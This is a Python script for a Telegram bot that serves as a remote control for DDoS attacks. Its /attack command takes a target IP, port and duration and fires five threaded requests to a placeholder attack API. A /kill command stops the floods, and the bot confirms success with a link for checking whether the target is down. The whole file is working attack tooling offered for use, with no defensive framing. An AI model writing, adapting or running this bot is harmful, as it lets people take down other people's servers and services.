from telegram.ext import Updater, CommandHandler, Filters
import requests
import threading

group_id = id_group
your_user_id = id_admin
def start(update, context):
    update.message.reply_text("👋Hello User\n➤Use /attack to send attack\n➤Use /kill to stop attack")
def send_request(url):
    requests.get(url)
def kill(update, context):
    if update.message.chat_id != your_user_id and update.message.chat_id != group_id:
        return

    url1 = f"http://api/?action=kill"
    url2 = f"http://api/?action=kill"
    url3 = f"http://api/?action=kill"
    url4 = f"http://api/?action=kill"
    url5 = f"http://api/?action=kill"

    thread1 = threading.Thread(target=send_request, args=(url1,))
    thread2 = threading.Thread(target=send_request, args=(url2,))
    thread3 = threading.Thread(target=send_request, args=(url3,))
    thread4 = threading.Thread(target=send_request, args=(url4,))
    thread5 = threading.Thread(target=send_request, args=(url5,))
    thread1.start()
    thread2.start()
    thread3.start()
    thread4.start()
    thread5.start()

    print(f"Kill All DDoS Process")
    update.message.reply_text(f"✅Kill All DDoS Process Success")

def attack(update, context):
    if update.message.chat_id != your_user_id and update.message.chat_id != group_id:
        return

    args = context.args
    if len(args) != 3:
        update.message.reply_text("Usage: /attack ip port time")
        return

    ip, port, time = args

    url1 = f"http://api/?ip={ip}&port={port}&thread=20&time={time}"
    url2 = f"http://api/?ip={ip}&port={port}&thread=20&time={time}"
    url3 = f"http://api/?ip={ip}&port={port}&thread=20&time={time}"
    url4 = f"http://api/?ip={ip}&port={port}&thread=20&time={time}"
    url5 = f"http://api/?ip={ip}&port={port}&thread=20&time={time}"

    thread1 = threading.Thread(target=send_request, args=(url1,))
    thread2 = threading.Thread(target=send_request, args=(url2,))
    thread3 = threading.Thread(target=send_request, args=(url3,))
    thread4 = threading.Thread(target=send_request, args=(url4,))
    thread5 = threading.Thread(target=send_request, args=(url5,))
    thread1.start()
    thread2.start()
    thread3.start()
    thread4.start()
    thread5.start()

    print(f"Attack {ip}:{port} in {time} second")
    update.message.reply_text(f"✅DDoS Attack Sent Success\n  ┏➤IP: {ip}\n  ┣➤Port: {port}\n  ┗➤Time: {time}s\n⚠Check: https://check-host.net/check-ping?host={ip}")
def main():
    updater = Updater("TOKEN_BOT_TELEGRAM", use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("kill", kill, Filters.chat(chat_id=group_id) | Filters.user(user_id=your_user_id)))
    dp.add_handler(CommandHandler("attack", attack, Filters.chat(chat_id=group_id) | Filters.user(user_id=your_user_id)))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
